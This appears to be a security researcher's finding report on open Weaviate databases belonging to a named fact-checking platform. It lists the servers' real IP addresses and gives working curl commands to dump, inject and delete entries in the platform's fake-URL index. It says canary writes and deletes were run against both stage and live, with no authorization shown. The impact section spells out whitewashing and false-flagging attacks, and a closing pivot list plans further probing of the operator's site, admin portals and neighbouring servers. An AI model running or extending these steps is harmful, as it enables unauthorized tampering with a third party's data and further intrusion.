# NamedSource -- Unauth RWD on Weaviate (Stage + Live)
**Date:** 2026-06-20
**Tool:** weavscan
**Severity:** CRITICAL
**Status:** CONFIRMED -- unauth read + write + delete

---

## Target

| Field | Stage | Live |
|---|---|---|
| IP | 5.78.177.119 | 5.78.189.252 |
| Port | 8080 | 8080 |
| Service | Weaviate 1.36.5 | Weaviate 1.37.0-rc.1 |
| Hosting | Hetzner | Hetzner |
| Node | ns_weaviate | ns_weaviate |
| Auth | NONE | NONE |
| Objects | ~81 | ~43 |

Both environments share the node name `ns_weaviate` and are open simultaneously.

---

## Operator Attribution

**NamedSource** -- a content reliability and fact-checking platform that tracks URL attribution and flags misleading or fake content.

| Evidence | Source |
|---|---|
| Subdomain | stage.namedsource.com, live.namedsource.com |
| FakeIndex content | Records reference namedsource.com URLs directly |
| FakeIndex entries | "This is not our official link" explanations tied to namedsource.com post paths |

---

## Data

### Classes (identical schema on both environments)

| Class | Fields | Description |
|---|---|---|
| Documents | document_id, chunk_id, metadata, preview, chunk_text | Full document corpus used to support fact-check claims |
| DocumentURLIndex | document_id, url, maps_to | URL-to-document mapping table |
| RedAlerts | document_id, chunk_id, metadata, preview, chunk_text | High-severity flagged content (same schema as Documents) |
| FakeIndex | url, maps_to (array of UUIDs), explanation | Curated list of fake/misleading URLs -- the platform's core trust product |

Stage (81 objects) is ahead of live (43 objects) -- stage has more content and is the leading deployment environment.

### FakeIndex Sample Records

```json
{
  "url": "https://stage.namedsource.com/posts/6ff41054-6087-477d-b747-d0658bb785ed",
  "explanation": "This is not our official link"
}

{
  "url": "yRCUTp5V4no",
  "explanation": "DeFi education fund has nothing to do with pizza reviews"
}
```

---

## Access Matrix

### Stage (5.78.177.119)

| Operation | Result | HTTP |
|---|---|---|
| Read schema | SUCCESS | 200 |
| Read objects | SUCCESS | 200 |
| Write (FakeIndex) | SUCCESS | 200 |
| Delete (FakeIndex) | SUCCESS | 204 |
| Verify deleted | GONE | 404 |

**Canary UUID (stage):** `66db8bac-3d70-4c13-b076-9741bbaedd53`
Written to FakeIndex class. Write 200, Delete 204, Verify 404.

### Live (5.78.189.252)

| Operation | Result | HTTP |
|---|---|---|
| Read schema | SUCCESS | 200 |
| Read objects | SUCCESS | 200 |
| Write | SUCCESS | 200 |
| Delete | SUCCESS | 204 |

---

## PoC

### Read -- enumerate FakeIndex

```bash
# Schema
curl -s http://5.78.177.119:8080/v1/schema | jq '.classes[].class'

# FakeIndex objects
curl -s "http://5.78.177.119:8080/v1/objects?class=FakeIndex&limit=25" \
  | jq '.objects[] | {url: .properties.url, explanation: .properties.explanation}'
```

### Write -- inject a false fake-URL entry

```bash
curl -s -X POST http://5.78.177.119:8080/v1/objects \
  -H "Content-Type: application/json" \
  -d '{
    "class": "FakeIndex",
    "id": "66db8bac-3d70-4c13-b076-9741bbaedd53",
    "properties": {
      "url": "https://canary.test/nuclide-rwd-probe",
      "explanation": "canary -- nuclide security research 2026-06-20"
    }
  }' | jq '.id'
```

### Delete -- remove canary

```bash
curl -s -X DELETE \
  http://5.78.177.119:8080/v1/objects/FakeIndex/66db8bac-3d70-4c13-b076-9741bbaedd53

# Verify gone
curl -o /dev/null -w "%{http_code}" \
  http://5.78.177.119:8080/v1/objects/FakeIndex/66db8bac-3d70-4c13-b076-9741bbaedd53
# Expected: 404
```

---

## Impact

### FakeIndex Tampering -- Core Trust Product

The `FakeIndex` is NamedSource's editorial output: a curated registry of URLs flagged as fake or misleading. Write access allows two classes of attack:

- **Whitewashing:** DELETE legitimate fake-URL entries to remove known disinformation sources from the index. The platform's fact-checking output silently becomes incomplete.
- **Weaponized censorship:** INSERT legitimate URLs as fake. The platform flags accurate reporting as disinformation.

Neither attack requires authentication. Both are silent and leave no application-layer audit trail.

### Dual-Environment Exposure

Stage and live are both open. A remediation that closes one leaves the other exposed. Stage (81 objects) carries more data and is the leading environment -- it is likely used for testing new content before promotion to live.

### RedAlerts Disclosure

The `RedAlerts` class contains high-severity flagged content. If embargo procedures exist for fact-check publishing, contents here may be pre-publication material.

### Full Content Corpus Read

`Documents` and `DocumentURLIndex` expose the entire evidence base used to support fact-check claims -- the source documents and the URL-to-document mapping. Read access is sufficient to exfiltrate the full research corpus.

### Version Risk

Live runs Weaviate `1.37.0-rc.1` -- a release candidate. RC versions may carry unfixed bugs not yet addressed in a stable release.

---

## Pivot Avenues

1. `namedsource.com` -- main platform; probe for authenticated API, admin portal, or editorial dashboard
2. Stage environment (5.78.177.119) -- carries more objects, likely has debug endpoints and test fixtures not in live
3. FakeIndex full scroll -- read all entries to map the complete set of flagged sources; understand scoring and trust logic
4. Weaviate 1.37.0-rc.1 changelog -- review pre-release diff for unpatched bugs between RC and stable
5. Hetzner ASN -- check for co-located services under the same operator ASN that may share auth posture
6. DocumentURLIndex cross-reference -- correlate mapped URLs against live web to identify embargoed or unpublished research targets

---

## Tool Reference

**weavscan** -- https://github.com/nuclide-research/weavscan
